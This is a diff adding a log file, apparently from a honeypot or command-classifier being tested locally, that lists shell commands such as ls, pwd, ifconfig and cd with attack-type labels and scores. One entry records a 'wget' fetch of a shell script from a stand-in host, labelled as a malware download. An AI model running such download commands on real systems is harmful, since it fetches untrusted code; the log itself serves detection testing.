@@ -1,0 +1,51 @@
+
+================== ATTACK LOG ==================
+Timestamp   : 2026-06-25 15:57:42
+IP Address  : 127.0.0.1
+Command     : SSH-2.0-OpenSSH_for_Windows_9.5
+Attack Type : Lateral Movement
+Score       : 5
+===============================================
+
+
+================== ATTACK LOG ==================
+Timestamp   : 2026-06-25 16:05:49
+IP Address  : 127.0.0.1
+Command     : ls
+Attack Type : Unknown
+Score       : 5
+===============================================
+
+
+================== ATTACK LOG ==================
+Timestamp   : 2026-06-25 16:05:53
+IP Address  : 127.0.0.1
+Command     : pwd
+Attack Type : Unknown
+Score       : 5
+===============================================
+
+
+================== ATTACK LOG ==================
+Timestamp   : 2026-06-25 16:07:01
+IP Address  : 127.0.0.1
+Command     : ifconfig
+Attack Type : Unknown
+Score       : 5
+===============================================
+
+2026-06-25 16:11:20   127.0.0.1         pwd               Unknown                  5
+2026-06-25 16:13:52   127.0.0.1         ls                Reconnaissance           20
+2026-06-25 16:17:51   127.0.0.1         ls                Reconnaissance           20
+2026-06-25 16:17:56   127.0.0.1         pwd               Reconnaissance           20
+2026-06-25 16:19:12   127.0.0.1         netcard           Unknown                  5
+2026-06-25 16:19:24   127.0.0.1         netstad           Unknown                  5
+2026-06-25 16:20:10   127.0.0.1         top               Unknown                  5
+2026-06-25 16:20:52   127.0.0.1         wget http://example.com/test.shMalware Download         90
+2026-06-25 17:05:07   127.0.0.1         ls                Reconnaissance           20
+2026-06-25 17:05:08   127.0.0.1         pwd               Reconnaissance           20
+2026-06-25 17:05:15   127.0.0.1         cd                Directory Navigation     10
+2026-06-25 17:05:18   127.0.0.1         cd ..             Directory Navigation     10
+2026-06-25 17:05:32   127.0.0.1         ls                Reconnaissance           20
+2026-06-25 17:05:39   127.0.0.1         cd dev            Directory Navigation     10
+2026-06-25 17:05:45   127.0.0.1         cd backup         Directory Navigation     10
